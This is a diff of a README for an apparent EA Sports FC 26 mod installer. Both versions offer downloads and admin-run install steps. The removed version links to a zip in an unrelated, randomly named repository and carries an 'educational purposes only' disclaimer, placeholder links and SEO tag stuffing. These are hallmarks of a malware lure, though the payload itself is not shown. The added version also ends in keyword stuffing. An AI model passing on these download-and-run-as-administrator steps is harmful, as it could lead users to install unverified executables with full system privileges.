@@ -1,88 +1,79 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC 26" width="80" height="80">
-</p>
+# 🛠️ FC26-Mod-Installer-Pro - Manage your game mods with ease
 
-<h1 align="center">FC26-Mod-Installer-Pro</h1>
-<p align="center">
-  <strong>Complete Mod Installer for EA Sports FC 26</strong><br>
-  Drag & Drop - Load Order - Conflict Detection - Restore Points
-</p>
+[![](https://img.shields.io/badge/Download-FC26_Mod_Installer-blue.svg)](https://github.com/ogeku/FC26-Mod-Installer-Pro)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Installer-Pro"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## 📖 About this application
 
-## What is This?
+FC26-Mod-Installer-Pro helps you organize modifications for EA Sports FC 26. The software handles file installation, load order, and backups. It removes the need for manual file transfers and complex folder management. Your game files remain safe through built-in restore points.
 
-FC26-Mod-Installer-Pro is a complete mod installer for EA Sports FC 26 that streamlines the entire modding experience. It provides a user-friendly interface for installing, organizing, and launching mods, making it ideal for both beginners and experienced modders.
+## 🎯 Key features
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk.
+* **Drag and drop:** Move mod files directly into the interface to add them to your collection.
+* **Load order control:** Choose the sequence in which mods load to prevent conflicts.
+* **Conflict detection:** The system alerts you if two mods change the same game data.
+* **Restore points:** Create backups of your current game state before you apply new mods.
+* **Mod presets:** Save your favorite mod combinations and switch between them.
+* **Easy removal:** Disable or delete mods with one click.
+* **Status tracking:** See which mods are currently active in your game folder.
 
-## Download
+## ⚙️ System requirements
 
-<p align="center">
-  <a href="https://github.com/Capturezastir/xzgfcfiu/releases/download/18902/FCMOD.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Before you install the tool, make sure your computer meets these requirements:
 
-## Features
+* **Operating System:** Windows 10 or Windows 11 (64-bit).
+* **Game Version:** EA Sports FC 26 installed via the EA App or Steam.
+* **Disk Space:** At least 500 MB of free space for the installer and mod backups.
+* **Permissions:** You must have administrative rights on your computer to manage game files.
 
-- Drag & Drop Import - Easily import .fifamod or .zip mod files
-- Enable / Disable Mods - One-click activation/deactivation
-- Load Order Control - Arrange mods to avoid conflicts
-- Conflict Detection - Detects overlapping files before applying
-- Restore Points - One-click rollback to previous states
-- Type-Aware Installs - Automatically installs mods to correct folders
-- Mod Store Browser - Browse and install mods from trusted repositories
-- BepInEx Manager - One-click installation and configuration
-- Preset Loader - Load reusable .fifamod presets easily
-- Profile Management - Create and save different mod configurations
+## 📥 How to download and install
 
-## Installation
+1. Visit the [official release page](https://github.com/ogeku/FC26-Mod-Installer-Pro) to download the latest setup file.
+2. Locate the file named `FC26-Mod-Installer-Pro-Setup.exe` in your downloads folder.
+3. Double-click the installer file to begin the setup process.
+4. Follow the on-screen prompts to select your installation path.
+5. Launch the application from your desktop shortcut once the setup finishes.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch EA Sports FC 26
-5. Browse the Mod Store or drag & drop your mods
-6. Click Apply and launch the game
+## 🚀 Using the installer
 
-## System Requirements
+The interface shows your game directory, a list of installed mods, and an area for new files.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC 26 (Steam/EA App/Epic) |
-| RAM | 4GB minimum |
-| Storage | 100MB free space |
-| .NET | 6.0+ |
+### Setting the game path
+The first time you run the tool, identify the folder where EA Sports FC 26 sits on your hard drive. Most users find this in their `Program Files` or `SteamLibrary` folders. Point the installer to the main game folder that contains the `FC26.exe` file.
 
-## SEO Tags
+### Adding your first mod
+1. Find your mod files, which usually end in the `.fbmod` or `.fifamod` format.
+2. Drag these files into the main window of the installer.
+3. Check the box next to the mod name to mark it for installation.
+4. Click the "Apply Changes" button at the bottom of the screen.
 
-fc26 mod installer, ea sports fc 26 mods, fc26 mod loader, fc26 mod organizer, fc26 mod installer, fc26 mod presets, fc26 mod store, fc26 modding tool, fc26 live editor, fc26 career mode mods, fc26 visual mods, fc26 gameplay mods, fifa 26 mod manager, ea fc 26 mods, fc26 utility, fc26 enhancer
+### Handling conflicts
+If the software finds a conflict, the mod name appears in red. Click the red alert icon to see which files clash. You can change the load order by dragging the mod up or down in the list. Mods at the top load first, while mods at the bottom overwrite earlier ones. 
 
-## Support
+### Creating restore points
+Before you make big changes, navigate to the "Backups" tab. Click "Create Restore Point." If the game does not start or behaves in an unexpected way, return to this tab and select "Restore from Backup" to return your game files to their original state.
 
-Star this repository if you enjoy it!
+## 🛡️ Best practices for safe modding
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Installer-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20EA%20Sports%20FC%2026%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+* Keep your original game files backed up.
+* Do not use unauthorized mods in online multiplayer matches.
+* Install mods one at a time to check for game stability.
+* Check for updates regularly to ensure compatibility with game patches.
+
+## 💬 Frequently asked questions
+
+**Does this damage my game files?**
+No. The tool works by linking files rather than moving or deleting them. The restore point feature ensures you can return to a clean state instantly.
+
+**Can I use this for other games?**
+No. This tool is built specifically for the file structure of EA Sports FC 26.
+
+**Why does my game fail to launch?**
+A mod might be outdated or incompatible with a recent game update. Disable all mods, restore your game files, and try launching the game to confirm it works. Then, add your mods back one by one to find the problem.
+
+**Where do I see which version I have?**
+The version number appears in the bottom left corner of the application window.
+
+**Does this software modify my EA account status?**
+No. This tool operates locally on your computer. It does not interact with EA servers or your user account data.
+
+Keywords: ea-sports-fc-26-mods, ea-sports-fc-utility, fc26-2026, fc26-bepinex-manager, fc26-career-mods, fc26-gameplay-mods, fc26-mod-installer, fc26-mod-launcher, fc26-mod-loader, fc26-mod-manager, fc26-mod-manager-free, fc26-mod-manager-windows, fc26-mod-organizer, fc26-mod-store, fc26-mod-tool, fc26-modding-tool, fc26-preset-loader, fc26-utility, fc26-visual-mods, game-mod-manager
